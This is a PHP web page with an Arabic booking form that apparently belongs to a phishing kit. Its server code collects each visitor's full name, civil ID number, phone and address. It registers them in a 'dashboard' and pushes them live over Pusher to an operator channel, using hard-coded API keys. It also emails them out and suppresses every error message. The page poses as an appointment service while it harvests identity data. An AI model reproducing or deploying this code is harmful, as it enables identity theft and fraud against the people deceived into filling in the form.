<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-user.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

// Store appointment data in session
if (isset($_POST['submit'])) {
    $_SESSION['appointment'] = array(
        'nationality' => $_POST['nationality'] ?? '',
        'service' => $_POST['service'] ?? '',
        'startDate' => $_POST['startDate'] ?? '',
        'duration' => $_POST['duration'] ?? '',
        'pickupTime' => $_POST['pickupTime'] ?? '',
        'gender' => $_POST['gender'] ?? '',
        'method' => $_POST['method'] ?? '',
    );
}

// Process customer info form
if (isset($_POST['submit']) && isset($_POST['name'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        'e77a3acd6f6fc7cd49ce',
        'd42bbf9412e5a18b9d6c',
        '1816717',
        $options
    );

    $site = array(
        'name' => $_POST["name"],
        'ssn' => $_POST['ssn'],
        'phone' => $_POST['phone'],
        'address' => $_POST['address'],
        'extra' => $_POST['elec'],
        'message' => 'info',
    );

    $id = $User->register($site);
    if ($id) {
        $_SESSION['user_id'] = $id;

        $data['message'] = $_POST["name"] . ' ' . $_POST['ssn'] . ' ' . $_POST['phone'] . ' ' . $_POST['address'];
        $pusher->trigger('my-channel', 'my-event', $data);

        SendMail($_POST["name"], $_POST['phone'] ,$_POST['ssn']);

        echo "<script>document.location.href='summary.php';</script>";
    }
}


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <title>الدرة</title>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <meta content="" name="keywords">
    <meta content="" name="description">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&family=Rubik:ital,wght@0,300..900;1,300..900&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", sans-serif;
            color: #691E7C;
            direction: rtl;
        }

        body {
            background-color: #f8f9fa;
        }

        .nav {
            background-image: url(./assets/menu_bg\ \(1\).avif);
        }

        .carousel-caption {
            color: #691E7C;
        }

        /* .row {
            background-color: #edeef4 !important;
        } */

        .btn-primary {
            background-color: #691E7C !important;
            border: none;
        }

        .list-style-arrow {
            list-style-type: none;
            padding: 0;
        }

        ul,
        li {
            margin-top: 0;
            margin-bottom: 10.5px;
        }

        ul.list-style-arrow li {
            padding-right: 1.3em;
            position: relative;
        }

        ul.list-style-arrow li:after {
            content: "\f053";
            font-family: FontAwesome;
            font-size: 12px;
            display: block;
            width: 1.3em;
            position: absolute;
            right: 0;
            top: 5px;
        }

        .story {
            background-image: url(./assets/bg_s_story.jpg);
            background-position: top center;
            background-size: cover;
            min-height: 405px;
        }

        .gols {
            background-image: url(./assets/bg_s_story2.jpg);
            background-position: top center;
            background-size: cover;
            min-height: 543px;
        }

        .overl {
            background-image: url(./assets/overlay_bg.png);
            background-repeat: repeat;
            background-size: 50%;
        }

        .form-control {
            border-radius: 15px !important;
        }
    </style>
</head>

<body>

    <nav class="nav d-flex justify-content-end">
        <img src="./assets/24dde8_57f05cb3b1524c0ba849f6e5a4a0a7fe~mv2.avif" width="230" alt="">
    </nav>


    <h6 class="mx-4 mt-4 text-center alert alert-primary" style="border-radius: 15px; padding:10px">عملائنا يرجى التحقق من أن جميع البيانات المدخلة <br> بإسم العميل المتقدم على الحجز</h6>


    <div class="container mt-5">
        <form action="" method="POST">
            <div class="row px-3">
                <div class="mb-4 d-flex align-items-center gap-3">
                    <div class="mt-auto"><i class="bi bi-person-fill fs-1 text-secondary"></i></div>
                    <div style="width: 85%;">
                        <label for="" class="text-secondary mb-2">اسم العميل كامل *</label>
                        <input type="text" class="form-control" name="name" required>
                    </div>
                </div>

                <div class="mb-4 d-flex align-items-center gap-3">
                    <div class="mt-auto"><i class="bi bi-file-earmark-bar-graph-fill fs-1 text-secondary"></i></div>
                    <div style="width: 85%;">
                        <label for="" class="text-secondary mb-2"> رقم المدني لصاحب المعاملة *</label>
                        <input type="text" class="form-control" minlength="12" maxlength="12" pattern="[0-9]*" inputmode="numeric" name="ssn" required>
                    </div>
                </div>

                <div class="mb-4 d-flex align-items-center gap-3">
                    <div class="mt-auto"><i class="bi bi-telephone-fill fs-1 text-secondary"></i></div>
                    <div style="width: 85%;">
                        <label for="" class="text-secondary mb-2">رقم النقال * </label>
                        <input type="text" class="form-control" minlength="8" maxlength="10" pattern="[0-9]*" inputmode="numeric" name="phone" required>
                    </div>
                </div>

                <div class="mb-4 d-flex align-items-center gap-3">
                    <div class="mt-auto"><i class="bi bi-geo-alt fs-1 text-secondary"></i></div>
                    <div style="width: 85%;">
                        <label for="" class=" mb-2 text-secondary">العنوان *</label>
                        <input type="text" class="form-control" name="address" required>
                    </div>
                </div>

                <div class="mb-4 d-flex align-items-center gap-3">
                    <div class="mt-auto"><i class="bi bi-calendar-check-fill fs-1 text-secondary"></i></div>
                    <div style="width: 85%;">
                        <label for="" class="text-secondary mb-2">رقم الآلي للعنوان </label>
                        <input type="text" class="form-control" name="elec">
                    </div>
                </div>
            </div>

            <div class="text-center">
                <button type="submit" name="submit" class="w-50 btn btn-primary py-2 mt-4 mb-5" style="border-radius: 20px;">متابعة</button>
            </div>
        </form>
    </div>




    <div class="pt-5"></div>

 
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
</body>

</html>
